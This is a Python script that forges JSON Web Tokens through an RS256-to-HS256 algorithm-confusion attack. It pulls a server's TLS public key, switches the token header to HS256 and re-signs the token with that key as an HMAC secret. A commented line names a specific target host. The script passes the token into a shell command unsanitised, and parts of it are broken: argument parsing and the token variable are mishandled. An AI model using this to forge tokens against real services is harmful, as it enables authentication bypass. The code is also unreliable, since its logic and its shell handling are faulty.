#!/bin/python3
import ssl
from socket import socket
from OpenSSL import crypto, SSL
import base64
import codecs
import binascii
import subprocess
import sys, getopt
import idna
from cryptography.hazmat.backends import default_backend
from cryptography import x509
import sys

def get_certificate(hostname, port):
    hostname_idna = idna.encode(hostname)
    sock = socket()

    sock.connect((hostname, port))
    peername = sock.getpeername()
    ctx = SSL.Context(SSL.SSLv23_METHOD) 
    ctx.check_hostname = False
    ctx.verify_mode = SSL.VERIFY_NONE

    sock_ssl = SSL.Connection(ctx, sock)
    sock_ssl.set_connect_state()
    sock_ssl.set_tlsext_host_name(hostname_idna)
    sock_ssl.do_handshake()
    cert = sock_ssl.get_peer_certificate()

    key = crypto.dump_publickey(crypto.FILETYPE_PEM,cert.get_pubkey())
    sock_ssl.close()
    sock.close()
    return key

try:
	opts, args = getopt.getopt(sys.argv,"d:j:",["Domain=","JWT="])
except getopt.GetoptError:
	sys.exit(2)

for opt, arg in opts:
	if opt in ("-d"):
		hostname = arg
	elif opt in ("-j"):
		jwt_arg = arg

jwt_arg = ''
#hostname='apis.pickup-services.com'
port=443

jwt = jwt_arg.split('.')
jwt[0] = base64.b64decode(jwt[0]).decode('utf-8')
jwt[0] = jwt[0].replace('RS256','HS256')
jwt[0] = base64.b64encode(jwt[0].encode('utf-8'))
jwt[0] = jwt[0].replace(b'=',b'')
jwt = jwt[0]+b'.'+str.encode(jwt[1])

key = get_certificate(hostname, port)
key = codecs.encode(key, "hex")
key = key.decode("utf-8")
print(key)
jwt=jwt.decode("utf-8")
cmd = 'echo -n "{}" | openssl dgst -sha256 -mac HMAC -macopt hexkey:{}'.format(jwt, key)
decrypted = subprocess.check_output(cmd, shell=True)
decrypted=decrypted.decode("utf-8")
decrypted=decrypted[9:-3]
decrypted = base64.urlsafe_b64encode(binascii.a2b_hex(decrypted)).replace(b'=',b'')

jwt=str.encode(jwt)+b'.'+decrypted
print(jwt.decode("utf-8"))